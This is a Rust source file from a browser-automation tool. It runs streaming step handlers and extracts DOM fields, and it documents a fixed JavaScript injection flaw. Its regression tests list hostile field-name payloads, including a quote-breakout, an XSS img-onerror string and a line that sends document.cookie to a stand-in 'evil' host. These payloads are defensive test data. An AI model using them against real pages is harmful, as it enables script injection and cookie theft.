use std::collections::HashMap;

use super::manager::StreamingSessionManager;
use crate::automation::step_executor;
use crate::models::workflow::WorkflowStepConfig;

/// Locate a handler's extract-field by `[data-extract="<name>"]`, `#<name>`, or
/// `[name="<name>"]` and return its value.
///
/// SECURITY: `name` is handler config, i.e. remote-supplied, and is passed as a
/// serialized `evaluate` ARGUMENT — never interpolated into this source. The previous
/// form was `format!(…'[data-extract="{name}"]'…, name.replace('"', "\\\""))`: the
/// surrounding JS literal is delimited by `'` while the escape only handled `"`, so a
/// field name of `a'+(globalThis.PWNED=1)+'` closed the literal and executed — on a
/// page that carries the full privileged bridge surface (see streaming::runtime_bridge).
/// `CSS.escape` covers the `#<name>` form, where an id fragment (not a string literal)
/// would otherwise still allow selector injection.
const EXTRACT_FIELD_JS: &str = r#"(name) => {
    const esc = (typeof CSS !== 'undefined' && CSS.escape)
        ? CSS.escape(name)
        : String(name).replace(/[^\w-]/g, '\\$&');
    const attr = String(name).replace(/["\\]/g, '\\$&');
    const selectors = [
        '[data-extract="' + attr + '"]',
        '#' + esc,
        '[name="' + attr + '"]'
    ];
    for (const sel of selectors) {
        let el = null;
        try { el = document.querySelector(sel); } catch (e) { continue; }
        if (el) {
            return el.value !== undefined && el.value !== ''
                ? el.value
                : (el.textContent || el.innerText || '');
        }
    }
    return null;
}"#;

/// Run a registered step-handler and return the extracted fields on success.
///
/// The caller MUST emit a `command_response { request_id, data }` with the
/// returned Value — a steps-type handler produces its result here and there is
/// no async `ps.respond` callback to carry it, so if the caller dropped it the
/// coordinator would hang until its turn watchdog fired.
pub async fn execute_step_handler(
    manager: &mut StreamingSessionManager,
    handler_name: &str,
    data: &serde_json::Value,
    request_id: &str,
) -> Result<serde_json::Value, anyhow::Error> {
    let max_retries = 2;

    for attempt in 0..max_retries {
        match do_execute_handler(manager, handler_name, data).await {
            Ok(result) => {
                tracing::debug!(
                    handler = handler_name,
                    request_id = request_id,
                    fields = result.as_object().map(|o| o.len()).unwrap_or(0),
                    "Handler executed successfully"
                );
                return Ok(result);
            }
            Err(e) => {
                // Detect logout either from the error string OR from live page
                // health (URL bounced to a login page / expiry notice in the DOM),
                // so a step that failed for a subtler reason than a typed error
                // still triggers a re-login. See streaming::health.
                let is_session_expired = e.to_string().contains("SessionExpired")
                    || e.to_string().contains("Session expired")
                    || manager.is_session_expired().await;

                if is_session_expired && attempt == 0 {
                    tracing::warn!(
                        handler = handler_name,
                        "Session expired during handler, attempting restore (re-login)"
                    );

                    // Real restore: re-navigate + re-run the setup (login) steps +
                    // re-inject the runtime — not just a window.ps re-inject, which
                    // would leave the session unauthenticated.
                    if let Err(restore_err) = manager.restore_session().await {
                        tracing::warn!(
                            error = %restore_err,
                            "Session restore (re-login) failed"
                        );
                    }
                    continue;
                }

                tracing::error!(
                    handler = handler_name,
                    attempt = attempt,
                    error = %e,
                    "Handler execution failed"
                );
                return Err(e);
            }
        }
    }

    Err(anyhow::anyhow!(
        "Handler {} failed after {} retries",
        handler_name,
        max_retries
    ))
}

async fn do_execute_handler(
    manager: &mut StreamingSessionManager,
    handler_name: &str,
    invocation_data: &serde_json::Value,
) -> Result<serde_json::Value, anyhow::Error> {
    let handler = manager
        .get_handler(handler_name)
        .ok_or_else(|| anyhow::anyhow!("Handler not found: {}", handler_name))?
        .clone();

    manager.touch();

    // Capture advanced script + bridge token (owned) before borrowing the page.
    let adv = manager.advanced_script_code().map(|s| s.to_string());
    let bridge_tok = manager.bridge_token();

    // Route to the conversation's tab (multi-conversation). When multi-conv is
    // off or no _thread_id is present, this resolves to the single main page.
    // Returns an OWNED page so the mutable borrow on `manager` ends here.
    let thread_id = invocation_data
        .get("_thread_id")
        .and_then(|v| v.as_str())
        .map(String::from);
    let page = manager.get_thread_page(thread_id.as_deref()).await?;
    let page = &page;

    // Re-inject runtime + advanced script if the page navigated and lost it.
    // All tabs in a session share the same bridge token.
    super::runtime_bridge::reinject_runtime(page, adv.as_deref(), &bridge_tok).await?;

    // Drain any pending bridge calls before starting.
    // Bridge calls now route via expose_function callbacks — no drain needed

    // Retrieve config data needed for step execution.
    let steps = manager.config_steps().cloned().unwrap_or_default();
    let base_form_data = manager.base_form_data();
    let setup_steps_count = manager.setup_steps_count;
    let credentials: HashMap<String, String> = HashMap::new();
    // Streaming handler/prerequisite steps carry no run-level files map (file
    // attachments in streaming are handled separately, §9.2); an inert RunFiles makes
    // an upload/wait_for_download step fail closed (File assets §6.3).
    let run_files = crate::automation::files::RunFiles::from_config(&serde_json::Value::Null, None);

    // ── Phase 1: Prerequisite steps ───────────────────────────
    // Run steps from setup_steps_count up to the handler's start index.
    // These are "common prerequisite" steps that every handler needs
    // (e.g., navigate to the right page, dismiss modals, etc.).
    if let Some((handler_start, _)) = handler.step_range {
        for (i, step) in steps
            .iter()
            .enumerate()
            .take(handler_start.min(steps.len()))
            .skip(setup_steps_count)
        {
            let step_type = step
                .get("type")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");

            let step_config: WorkflowStepConfig = serde_json::from_value(
                step.get("config").cloned().unwrap_or(serde_json::json!({})),
            )
            .unwrap_or_else(|_| serde_json::from_value(serde_json::json!({})).unwrap());

            tracing::debug!(
                step_index = i,
                step_type = step_type,
                handler = handler_name,
                "Running prerequisite step"
            );

            step_executor::execute_step(
                page,
                step_type,
                &step_config,
                &credentials,
                &base_form_data,
                &run_files,
                30_000,
                true, // fast_mode
            )
            .await
            .map_err(|e| {
                anyhow::anyhow!(
                    "Prerequisite step {} ({}) failed: {}",
                    i,
                    step_type,
                    e
                )
            })?;

            // Drain bridge calls between steps.
            // Bridge calls now route via expose_function callbacks — no drain needed
        }
    }

    // ── Phase 2: Handler steps ────────────────────────────────
    // Run the handler's own steps with merged form_data + invocation_data.
    let mut merged_form_data = base_form_data.clone();

    // Merge invocation data into form_data (invocation data takes precedence).
    if let Some(obj) = invocation_data.as_object() {
        for (k, v) in obj {
            if k == "_thread_id" {
                continue; // routing-only key, not form data
            }
            let str_val = match v {
                serde_json::Value::String(s) => s.clone(),
                other => other.to_string(),
            };
            merged_form_data.insert(k.clone(), str_val);
        }
    }

    if let Some((handler_start, handler_end)) = handler.step_range {
        let effective_end = handler_end.min(steps.len());
        for (i, step) in steps.iter().enumerate().take(effective_end).skip(handler_start) {
            let step_type = step
                .get("type")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");

            let step_config: WorkflowStepConfig = serde_json::from_value(
                step.get("config").cloned().unwrap_or(serde_json::json!({})),
            )
            .unwrap_or_else(|_| serde_json::from_value(serde_json::json!({})).unwrap());

            tracing::debug!(
                step_index = i,
                step_type = step_type,
                handler = handler_name,
                "Running handler step"
            );

            step_executor::execute_step(
                page,
                step_type,
                &step_config,
                &credentials,
                &merged_form_data,
                &run_files,
                30_000,
                true, // fast_mode
            )
            .await
            .map_err(|e| {
                anyhow::anyhow!(
                    "Handler step {} ({}) failed: {}",
                    i,
                    step_type,
                    e
                )
            })?;

            // Drain bridge calls between steps.
            // Bridge calls now route via expose_function callbacks — no drain needed
        }
    } else if handler.handler_type == "code" {
        // Code-based handler: evaluate the handler's JS code on the page.
        if let Some(ref code) = handler.code {
            let _: Result<serde_json::Value, _> =
                page.evaluate(code, None::<&()>).await;
        }
    }

    // ── Phase 3: Extract fields from DOM ──────────────────────
    let mut extracted = serde_json::Map::new();

    for field_name in &handler.extract_fields {
        // SECURITY: the field name goes in as an evaluate ARGUMENT — see EXTRACT_FIELD_JS.
        let args = serde_json::json!(field_name);
        let value: serde_json::Value = page
            .evaluate(EXTRACT_FIELD_JS, Some(&args))
            .await
            .unwrap_or(serde_json::Value::Null);

        extracted.insert(field_name.clone(), value);
    }

    // Final drain of bridge calls.
    // Bridge calls now route via expose_function callbacks — no drain needed

    Ok(serde_json::Value::Object(extracted))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Hostile field names that broke out of the old `'…{name}…'` interpolation.
    const HOSTILE_NAMES: &[&str] = &[
        // The verified breakout: closes the ' literal, runs code, reopens it.
        "a'+(globalThis.PWNED=1)+'",
        // Backslash before the quote — defeats any escape that handles `"`/`'`
        // without first escaping `\`.
        r#"a\');globalThis.PWNED=1;//"#,
        r#"a\"#,
        "\"]/*",
        "a'; fetch('//evil/'+document.cookie); '",
        "</script><img src=x onerror=alert(1)>",
        "a\nb",
    ];

    #[test]
    fn extract_field_js_is_parameterised_not_interpolated() {
        // The whole fix: one static function of `name`. If this ever regains a
        // `{}` format placeholder, the injection is back.
        assert!(
            EXTRACT_FIELD_JS.trim_start().starts_with("(name) =>"),
            "the probe must take the field name as a parameter"
        );
        assert!(
            !EXTRACT_FIELD_JS.contains("{name}"),
            "no format!-style interpolation site may remain"
        );
    }

    #[test]
    fn hostile_field_names_cannot_reach_the_js_source() {
        // The value travels as a JSON argument, so it is a string in the JS runtime and
        // never part of the program text.
        for hostile in HOSTILE_NAMES {
            let args = serde_json::json!(hostile);
            assert_eq!(
                args.as_str(),
                Some(*hostile),
                "the payload must survive verbatim as a STRING value"
            );
            let wire = serde_json::to_string(&args).expect("serializable");
            // A complete, self-contained JSON string literal: quoted at both ends and
            // re-parsable, i.e. nothing escaped out of it.
            assert!(wire.starts_with('"') && wire.ends_with('"'), "{wire}");
            let back: String = serde_json::from_str(&wire).expect("round trip");
            assert_eq!(&back, *hostile);
            // And it never appears in the program text we send.
            assert!(
                !EXTRACT_FIELD_JS.contains(hostile),
                "the probe source must not carry the payload"
            );
        }
    }

    #[test]
    fn extract_field_js_escapes_both_delimiters_it_builds_selectors_from() {
        // `attr` is embedded in a double-quoted CSS attribute selector, so BOTH `"` and
        // `\` must be escaped (in one pass, or the inserted backslashes get re-escaped).
        assert!(
            EXTRACT_FIELD_JS.contains(r#"replace(/["\\]/g, '\\$&')"#),
            "attribute-selector escaping must cover backslash as well as quote"
        );
        // And the id form uses CSS.escape rather than raw concatenation.
        assert!(EXTRACT_FIELD_JS.contains("CSS.escape"));
    }
}
